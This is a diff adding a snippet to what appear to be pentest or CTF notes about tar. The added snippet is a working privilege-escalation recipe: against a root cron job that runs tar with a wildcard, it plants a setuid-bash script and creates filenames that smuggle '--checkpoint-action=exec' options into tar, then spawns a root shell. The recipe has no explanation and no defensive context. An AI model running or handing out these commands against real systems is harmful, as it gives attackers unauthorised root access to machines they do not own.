@@ -493,3 +493,16 @@ check zip,gz,7z,stix,rar files
  -p保留绝对路径，即允许备份数据中含有根目录
  -P保留数据原来权限及属性
 ```
+```
+CronJob:
+*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
+
+Solution:
+cd /opt/admin
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
+/opt/admin/pwn.sh
+touch /opt/admin/--checkpoint=1
+touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
+
+/tmp/bash -p
+```
